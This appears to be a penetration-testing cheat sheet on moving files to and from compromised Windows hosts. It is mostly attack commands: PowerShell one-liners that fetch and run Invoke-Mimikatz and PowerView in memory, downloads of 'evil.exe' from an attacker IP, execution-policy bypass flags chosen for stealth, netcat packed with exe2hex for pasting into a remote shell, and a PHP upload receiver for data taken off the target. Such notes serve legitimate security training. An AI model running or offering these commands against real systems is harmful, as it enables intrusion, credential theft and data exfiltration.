# File Transfer

There are many situations when transferring files either to or from a target system is necessary. We may successfully exploit a web application vulnerability, achieve RCE on a target web server, or even upload a web shell. There are many ways that we could upgrade our access to an interactive shell, and some require successfully transferring scripts, binaries, or tools to the target. During an internal assessment, we may find ourselves on a Windows host with a need to transfer over tools to perform enumeration of the Active Directory environment, to attempt privilege escalation, or have the need to download command output for offline processing.



## Windows File Transfer Methods

### PowerShell Downloads

```text
(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1',"C:\Users\Public\Downloads\PowerView.ps1")
```

From PowerShell 3.0, Invoke-WebRequest is also available, but it is noticeably slower at downloading files. The aliases `iwr`, `curl`, and `wget` can be used instead of Invoke-WebRequest.

```text
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

Instead of downloading to disk, the payload can instead be executed in memory, using Invoke-Expression, or the alias `iex`.

```text
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

IEX also accepts pipeline input.

```text
 Invoke-WebRequest https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1 | iex
```

There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download.  
This can be bypassed using the parameter `-UseBasicParsing`.

```text
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | iex
```

Alternatively, with administrative access to the machine, we can disable Internet Explorer’s First Run customization.

```text
reg add "HKLM\SOFTWARE\Microsoft\Internet Explorer\Main" /f /v DisableFirstRunCustomize /t REG_DWORD /d 2
```

```text
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://10.11.0.4/evil.exe" >>wget.ps1
echo $file = "new-exploit.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
```

Now we can use PowerShell to run the script and download our file. However, to ensure both correct and stealthy execution, we specify a number of options in the execution of the script   
  
First, we must allow execution of PowerShell scripts \(which is restricted by default\) with the - ExecutionPolicy keyword and Bypass value. Next, we will use `-NoLogo` and `-NonInteractive` to hide the PowerShell logo banner and suppress the interactive PowerShell prompt, respectively. The `-NoProfile` keyword will prevent PowerShell from loading the default profile \(which is not needed\), and finally we specify the script file with `-File` 

```text
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```

```text
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')
```

```text
powershell.exe "IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')"
```

### Windows Downloads with exe2hex and PowerShell

Starting on our Kali machine, we will compress the binary we want to transfer, convert it to a hex string, and embed it into a Windows script.   
On the Windows machine, we will paste this script into our shell and run it. It will redirect the hex data into powershell.exe , which will assemble it back into a binary.   
This will be done through a series of non-interactive commands. As an example, let’s use powershell.exe to transfer Netcat from our Kali Linux machine to our Windows client over a remote shell.

```text
cp /usr/share/windows-resources/binaries/nc.exe .
upx -9 nc.exe
exe2hex -x nc.exe -p nc.cmd
```

When we copy and paste this script into a shell on our Windows machine and run it, we can see that it does, in fact, create a perfectly-working copy of our original nc.exe.

```text
COPY content of nc.cmd to notepad and run with powershell
```

### Windows Uploads Using Windows Scripting Languages

create the following PHP script and save it as `upload.php` in our Kali webroot directory,`/var/www/html`:

```text
<?php
$uploaddir = '/var/www/uploads/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```

